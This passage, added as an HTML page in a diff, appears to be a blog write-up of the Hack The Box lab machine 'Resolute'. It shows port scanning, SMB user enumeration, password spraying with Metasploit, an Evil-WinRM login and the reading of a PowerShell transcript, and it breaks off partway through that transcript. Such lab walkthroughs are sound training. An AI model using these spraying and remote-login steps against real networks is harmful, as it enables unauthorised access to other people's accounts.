@@ -1,0 +1,661 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Find your way…">
+    <meta name="author" content="Sabe Barker">
+
+    <title>Resolute - Hack The Box · Sabe Barker</title>
+
+    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/resolute/">
+
+    <!-- Bootstrap core CSS -->
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+	<!-- Custom CSS -->
+    <link href="/assets/css/sabe.css" rel="stylesheet">
+    <!-- Lightbox -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
+    <!-- Favicons -->
+	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
+	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+	<link rel="manifest" href="/assets/img/favicons/manifest.json">
+	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
+	<link rel="icon" href="/assets/img/favicons/favicon.ico">
+	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
+	<meta name="application-name" content="Sabe Barker">
+	<meta name="msapplication-TileColor" content="#fff">
+	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+	<meta name="theme-color" content="#fff">
+	
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@sabebarker">
+    <meta name="twitter:creator" content="@sabebarker">
+    <meta name="twitter:title" content="Resolute - Hack The Box · Sabe Barker">
+    <meta name="twitter:description" content="Find your way…">
+    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/resolute/resolute_infocard.png">
+
+    <!-- Facebook -->
+    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/resolute/" />
+    <meta property="og:title" content="Resolute - Hack The Box · Sabe Barker">
+    <meta property="og:description" content="Find your way…">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/resolute/resolute_infocard.png">
+    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/resolute/resolute_infocard.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
+	<script>
+  		window.dataLayer = window.dataLayer || [];
+  		function gtag(){dataLayer.push(arguments);}
+  		gtag('js', new Date());
+
+  		gtag('config', 'UA-151243373-1');
+	</script>
+  </head>
+  <body>
+    <a class="skippy sr-only sr-only-focusable" href="#content">
+      <span class="skippy-text">Skip to main content</span>
+    </a>
+
+    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
+      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewBox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"/><stop offset="1" stop-color="#0bb1d3"/></linearGradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"/></svg>{ sabebarker }
+      </a>
+
+      <div class="navbar-nav-scroll">
+        <ul class="navbar-nav sb-navbar-nav flex-row">
+          <li class="nav-item">
+            <a class="nav-link " href="/search">
+        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewBox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"/></svg>
+      </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/">
+	      Home
+	     </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/blog">
+	      Blog
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link active" href="/writeups">
+	      Writeups
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/tools">
+	      Tools
+	    </a>
+          </li>
+        </ul>
+      </div>
+
+      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
+        <li class="nav-item">
+          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title><path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title><path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 24 24" role="img" focusable="false"><title>Facebook</title><path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"/><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg></a>
+       </li>
+      </ul>
+    </header>
+
+
+    <div class="container-fluid">
+      <div class="row flex-xl-nowrap">
+        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
+          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"/></svg></button>
+
+<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
+      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
+        Getting Started
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/getting-started/introduction/">
+              Introduction
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/basic-setup/">
+              Basic Setup
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
+              VPN Setup
+            </a>
+          </li></ul>
+    </div><div class="sb-toc-item active">
+      <a class="sb-toc-link" href="/writeups/hackthebox/machines/nest/">
+        Machines
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/machines/nest/">
+              Nest
+            </a>
+          </li><li class="active sb-sidenav-active">
+            <a href="/writeups/hackthebox/machines/resolute/">
+              Resolute
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/obscurity/">
+              Obscurity
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/openadmin/">
+              OpenAdmin
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/mango/">
+              Mango
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/traverxec/">
+              Traverxec
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/forest/">
+              Forest
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/postman/">
+              Postman
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/scavenger/">
+              Scavenger
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/json/">
+              Json
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/ai/">
+              AI
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/bitlab/">
+              Bitlab
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/craft/">
+              Craft
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/networked/">
+              Networked
+            </a>
+          </li></ul>
+    </div></nav>
+        </div>
+
+        
+          <div class="d-none d-xl-block col-xl-2 sb-toc">
+            <ul class="section-nav">
+<li class="toc-entry toc-h2"><a href="#enumeration">Enumeration</a></li>
+<li class="toc-entry toc-h2"><a href="#portscan">Portscan</a></li>
+<li class="toc-entry toc-h2"><a href="#enum4linux">Enum4Linux</a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#smb-login">SMB Login</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#user">User</a></li>
+<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
+<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
+</ul>
+          </div>
+        
+
+        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
+          <h1 class="sb-title" id="content">Resolute</h1>
+          <p class="sb-lead">Find your way…</p>
+          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/resolute/resolute_infocard.png" alt="HackTheBox Resolute Machine Info Card" class="img-fluid" /></p>
+
+<p><strong>Resolute</strong> is an easy difficulty machine running Windows. It tests your knowledge in <em>enumeration which leads you to accessing the system and privilege escalation through exploiting a system service</em>.</p>
+
+<p><strong><em>Edit:</em></strong> Fixed error stating “It tests your knowledge in <em>OSINT</em>”. This was meant to be <em>enumeration</em> and has been updated accordingly. Don’t copypasta templates without updating them correctly kids! Thanks to <strong><em>plast1k</em></strong> on <em>Reddit</em> for pointing it out.</p>
+
+<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>
+
+<h2 id="portscan">Portscan</h2>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan resolute.htb
+Grabbing ports...
+Ports grabbed!
+Scanning...
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-12-09 22:28 PST
+Nmap scan report <span class="k">for </span>resolute.htb <span class="o">(</span>10.10.10.169<span class="o">)</span>
+Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2019-12-10 06:28:00Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: MEGABANK<span class="o">)</span>
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49688/tcp open  msrpc        Microsoft Windows RPC
+49821/tcp open  unknown
+Service Info: Host: RESOLUTE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h39m17s, deviation: 4h37m08s, median: <span class="nt">-43s</span>
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE<span class="se">\x</span>00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System <span class="nb">time</span>: 2019-12-09T22:30:18-08:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2019-12-10T06:30:22
+|_  start_date: 2019-12-10T06:23:37
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>283.53 seconds</code></pre></figure>
+
+<p>A couple of things stand out. <em>WinRM</em> is accessible via port <code class="highlighter-rouge">5985</code> and we see that the <em>SMB</em> port <code class="highlighter-rouge">445</code> is also available.</p>
+
+<h2 id="enum4linux">Enum4Linux</h2>
+
+<p>Let’s go ahead and enumerate <em>SMB</em> as that can be quite fruitful at times.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">enum4linux 10.10.10.169
+Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Mon Dec  9 22:45:19 2019
+
+ <span class="o">==========================</span>
+|    Target Information    |
+ <span class="o">==========================</span>
+Target ........... resolute.htb
+RID Range ........ 500-550,1000-1050
+Username ......... <span class="s1">''</span>
+Password ......... <span class="s1">''</span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+ <span class="o">=============================</span>
+|    Users on resolute.htb    |
+ <span class="o">=============================</span>
+index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: <span class="o">(</span>null<span class="o">)</span>    Desc: <span class="o">(</span>null<span class="o">)</span>
+........... Snip ...........
+index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: <span class="o">(</span>null<span class="o">)</span>    Desc: <span class="o">(</span>null<span class="o">)</span>
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password <span class="nb">set </span>to W....123!
+index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: <span class="o">(</span>null<span class="o">)</span>    Desc: <span class="o">(</span>null<span class="o">)</span>
+........... Snip ...........</code></pre></figure>
+
+<p>A lot of detail is outputted and we find a bunch of users!</p>
+
+<p>We can see the account <code class="highlighter-rouge">marko</code> has a description that references a password. However, when we check this password against <code class="highlighter-rouge">markos</code> account we find it is invalid.</p>
+
+<p>Thinking about companies and how their <em>onboarding</em> process may be we can take from the description that when a new staff member has an account created the default password is potentially the one we found.</p>
+
+<p>Once the new staff member logs in they are probably directed to change their password. Hence why the password didn’t work for <code class="highlighter-rouge">marko</code>.</p>
+
+<p>Taking all the users we found we can throw them in a file and check the password against them all:</p>
+
+<h4 id="smb-login">SMB Login</h4>
+
+<p>We can do this using the <code class="highlighter-rouge">smb_login</code> module in <em>Metasploit</em>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.169:445      - 10.10.10.169:445 - Starting SMB login bruteforce
+<span class="o">[</span>-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: <span class="s1">'.\Administrator:W....123!'</span>,
+........... Snip ...........
+<span class="o">[</span>-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: <span class="s1">'.\claude:W....123!'</span>,
+<span class="o">[</span>+] 10.10.10.169:445      - 10.10.10.169:445 - Success: <span class="s1">'.\melanie:W....123!'</span>
+<span class="o">[</span>-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: <span class="s1">'.\zach:W....123!'</span>,
+<span class="o">[</span>-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: <span class="s1">'.\simon:W....123!'</span>,
+<span class="o">[</span>-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: <span class="s1">'.\naoki:W....123!'</span>,
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> resolute.htb:445      - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed</code></pre></figure>
+
+<p>We find that the password works with the user <code class="highlighter-rouge">melanie</code>.</p>
+
+<h2 id="user">User</h2>
+
+<p>Let’s go check it out:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">evil-winrm <span class="nt">-i</span> 10.10.10.169 <span class="nt">-u</span> melanie <span class="nt">-p</span> W...123!
+Evil-WinRM shell v2.0
+Info: Establishing connection to remote endpoint
+PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; <span class="nb">cat</span> ../Desktop/user.txt
+0c3be45fcf....8d3a978540</code></pre></figure>
+
+<p>We get the user flag!</p>
+
+<p>Checking out the user information for <code class="highlighter-rouge">melanie</code> we can’t see anything that stands out at us.</p>
+
+<p>Looking for other users we see the user <code class="highlighter-rouge">ryan</code> in <code class="highlighter-rouge">C:\Users</code>.</p>
+
+<p>Taking a look in the usual directories doesn’t show anything of use.</p>
+
+<p>Since we have access to <em>Powershell</em> let’s use it’s “power” to look for any hidden files!</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers&gt; Get-ChildItem <span class="nt">-Path</span> C:<span class="se">\ </span><span class="nt">-Include</span> <span class="k">*</span>.txt <span class="nt">-Hidden</span> <span class="nt">-File</span> <span class="nt">-Recurse</span> <span class="nt">-force</span> <span class="nt">-ErrorAction</span> SilentlyContinue
+
+
+Directory: C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                                                                                                                                                    
+<span class="nt">-arh--</span>        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt </code></pre></figure>
+
+<p>Hmm… a Powershell Transcript. This is kind of similar to <code class="highlighter-rouge">.bash_history</code> in Linux. The <code class="highlighter-rouge">Start-Transcript</code> command creates a history of a PowerShell session and output’s it to a file. The transcript includes all commands that the user types and all output that appears on the console.</p>
+
+<p>Nice, let’s not wait anytime in checking that out then:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">PS C:<span class="se">\P</span>STranscripts<span class="se">\2</span>0191203&gt; <span class="nb">cat </span>PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+<span class="k">**********************</span>
+Windows PowerShell transcript start
+Start <span class="nb">time</span>: 20191203063201
+Username: MEGABANK<span class="se">\r</span>yan
+RunAs User: MEGABANK<span class="se">\r</span>yan
+Machine: RESOLUTE <span class="o">(</span>Microsoft Windows NT 10.0.14393.0<span class="o">)</span>
+Host Application: C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>smprovhost.exe <span class="nt">-Embedding</span>
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+<span class="k">**********************</span>
+Command start <span class="nb">time</span>: 20191203063455
+<span class="k">**********************</span>
+PS&gt;TerminatingError<span class="o">()</span>: <span class="s2">"System error."</span>
+<span class="o">&gt;&gt;</span> CommandInvocation<span class="o">(</span>Invoke-Expression<span class="o">)</span>: <span class="s2">"Invoke-Expression"</span>
+<span class="o">&gt;&gt;</span> ParameterBinding<span class="o">(</span>Invoke-Expression<span class="o">)</span>: <span class="nv">name</span><span class="o">=</span><span class="s2">"Command"</span><span class="p">;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"-join(</span><span class="nv">$id</span><span class="s2">,'PS ',</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">,'@',</span><span class="nv">$env</span><span class="s2">:computername,' ',</span><span class="k">$((</span>gi <span class="nv">$pwd</span><span class="o">)</span>.Name<span class="o">)</span>,<span class="s1">'&gt; '</span><span class="o">)</span>
+<span class="k">if</span> <span class="o">(!</span><span class="nv">$?</span><span class="o">)</span> <span class="o">{</span> <span class="k">if</span><span class="o">(</span><span class="nv">$LASTEXITCODE</span><span class="o">)</span> <span class="o">{</span> <span class="nb">exit</span> <span class="nv">$LASTEXITCODE</span> <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="nb">exit </span><span class="m">1</span> <span class="o">}</span> <span class="o">}</span><span class="s2">"
+&gt;&gt; CommandInvocation(Out-String): "</span>Out-String<span class="s2">"
+&gt;&gt; ParameterBinding(Out-String): name="</span>Stream<span class="s2">"; value="</span>True<span class="s2">"
+**********************
+Command start time: 20191203063455
+**********************
+PS&gt;ParameterBinding(Out-String): name="</span>InputObject<span class="s2">"; value="</span>PS megabank<span class="se">\r</span>yan@RESOLUTE Documents&gt; <span class="s2">"
+PS megabank</span><span class="se">\r</span><span class="s2">yan@RESOLUTE Documents&gt;
+**********************
+Command start time: 20191203063515
+**********************
